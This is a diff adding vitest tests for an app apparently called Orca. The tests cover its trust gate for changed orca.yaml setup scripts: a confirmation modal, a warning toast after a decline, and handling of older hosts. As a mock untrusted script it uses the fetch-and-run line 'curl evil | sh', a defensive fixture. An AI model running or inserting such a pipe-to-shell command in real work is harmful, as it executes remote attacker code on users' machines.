@@ -1,12 +1,13 @@
-import { setLocalRuntimeCapabilitiesForTests } from '../../runtime/local-runtime-capabilities'
-import 'sonner'
+import { setLocalRuntimeCapabilitiesForTests } from '../../runtime/hosts/capabilities/local-runtime-capabilities'
+import { toast } from 'sonner'
 import type { ExecutionHostId } from '../../../../shared/execution-host'
 import { beforeEach, describe, expect, it, vi } from 'vitest'
+import { createHash } from 'node:crypto'
 import type { AppState } from '../types'
 import {
   createCompatibleRuntimeStatusResponse,
   type RuntimeEnvironmentCallRequest
-} from '../../runtime/runtime-compatibility-test-fixture'
+} from '../../runtime/rpc/testing/runtime-compatibility-test-fixture'
 import { TEST_REPO, makeWorktree } from './worktrees-slice-test-fixtures'
 import {
   createTestStore,
@@ -316,6 +317,121 @@ describe('worktree remote runtime mutations', () => {
         })
       })
     )
+  })
+
+  it('forwards the approved setup hash and runs the changed branch setup once approved', async () => {
+    const store = createRepoTestStore()
+    const openModal = vi.fn()
+    store.setState({ openModal })
+    mockApi.worktrees.create.mockResolvedValue({
+      worktree: makeWorktree({
+        id: 'repo1::/path/feature',
+        repoId: 'repo1',
+        path: '/path/feature'
+      }),
+      setupTrustMismatch: { contentHash: 'branch-hash', scriptContent: 'curl evil | sh' }
+    })
+    const create = store.getState().createWorktree
+    const args: Parameters<typeof create> = ['repo1', 'feature', 'origin/main', 'run']
+    args[25] = { approvedSetupHash: 'primary-hash' }
+
+    await create(...args)
+
+    expect(mockApi.worktrees.create).toHaveBeenCalledWith(
+      expect.objectContaining({ setupDecision: 'run', approvedSetupHash: 'primary-hash' })
+    )
+    await vi.waitFor(() => expect(openModal).toHaveBeenCalledOnce())
+    expect(openModal).toHaveBeenCalledWith(
+      'confirm-orca-yaml-hooks',
+      expect.objectContaining({
+        repoId: 'repo1',
+        scriptKind: 'setup',
+        scriptContent: 'curl evil | sh'
+      })
+    )
+    mockApi.worktrees.runApprovedSetup.mockResolvedValue({ status: 'started' })
+    openModal.mock.calls[0][1].onResolve('run')
+
+    await vi.waitFor(() =>
+      expect(mockApi.worktrees.runApprovedSetup).toHaveBeenCalledWith({
+        worktreeId: 'repo1::/path/feature',
+        approvedSetupHash: createHash('sha256').update('curl evil | sh').digest('hex')
+      })
+    )
+  })
+
+  it('keeps the workspace when setup is declined and offers the review again from the toast', async () => {
+    const store = createRepoTestStore()
+    const openModal = vi.fn()
+    store.setState({ openModal })
+    mockApi.worktrees.create.mockResolvedValue({
+      worktree: makeWorktree({ id: 'repo1::/path/kept', repoId: 'repo1', path: '/path/kept' }),
+      setupTrustMismatch: { contentHash: 'branch-hash', scriptContent: 'pnpm build' }
+    })
+
+    const result = await store.getState().createWorktree('repo1', 'kept', 'origin/main', 'run')
+    expect(result.worktree.id).toBe('repo1::/path/kept')
+    await vi.waitFor(() => expect(openModal).toHaveBeenCalledOnce())
+    openModal.mock.calls[0][1].onResolve('skip')
+
+    await vi.waitFor(() => expect(vi.mocked(toast.warning)).toHaveBeenCalled())
+    const [message, options] = vi.mocked(toast.warning).mock.calls.at(-1) ?? []
+    expect(message).toBe(
+      "Setup didn't run: this workspace's branch has different orca.yaml setup commands than the ones you approved."
+    )
+    expect(mockApi.worktrees.runApprovedSetup).not.toHaveBeenCalled()
+
+    mockApi.worktrees.runApprovedSetup.mockResolvedValue({ status: 'started' })
+    const toastOptions: unknown = options
+    expect(toastOptions).toMatchObject({ action: { label: 'Review setup' } })
+    // oxlint-disable-next-line typescript/consistent-type-assertions -- SAFETY: matched above as the toast's action, whose handler ignores the click event.
+    const { action } = toastOptions as { action: { onClick: () => void } }
+    action.onClick()
+    await vi.waitFor(() => expect(openModal).toHaveBeenCalledTimes(2))
+    expect(openModal.mock.calls[1][1]).toMatchObject({ scriptContent: 'pnpm build' })
+    openModal.mock.calls[1][1].onResolve('run')
+    await vi.waitFor(() =>
+      expect(mockApi.worktrees.runApprovedSetup).toHaveBeenCalledWith({
+        worktreeId: 'repo1::/path/kept',
+        approvedSetupHash: createHash('sha256').update('pnpm build').digest('hex')
+      })
+    )
+  })
+
+  it('keeps setup skipped on a host that predates running approved setup', async () => {
+    const status = createCompatibleRuntimeStatusResponse('runtime-remote')
+    if (status.ok) {
+      status.result.capabilities = status.result.capabilities?.filter(
+        (cap) => cap !== 'worktree.run-approved-setup.v1'
+      )
+    }
+    runtimeEnvironmentTransportCall.mockImplementation((args: RuntimeEnvironmentCallRequest) =>
+      args.method === 'status.get' ? status : runtimeEnvironmentCall(args)
+    )
+    runtimeEnvironmentCall.mockResolvedValue({
+      id: 'create',
+      ok: true,
+      result: {
+        worktree: makeWorktree({ id: 'repo1::/path/f', repoId: 'repo1', path: '/path/f' }),
+        setupTrustMismatch: { contentHash: 'branch-hash', scriptContent: 'curl evil | sh' }
+      }
+    })
+    const store = createRepoTestStore()
+    seedRepoHost(store, 'runtime:env-1')
+    const openModal = vi.fn()
+    store.setState({ openModal })
+
+    await store.getState().createWorktree('repo1', 'f', 'origin/main', 'run')
+    await vi.waitFor(() => expect(openModal).toHaveBeenCalledOnce())
+    openModal.mock.calls[0][1].onResolve('run')
+
+    await vi.waitFor(() =>
+      expect(vi.mocked(toast.warning)).toHaveBeenCalledWith(
+        'Approved. Update Orca on the workspace host to run setup for an existing workspace.'
+      )
+    )
+    const methods = runtimeEnvironmentCall.mock.calls.map(([call]) => call.method)
+    expect(methods).not.toContain('worktree.runApprovedSetup')
   })
 })
 
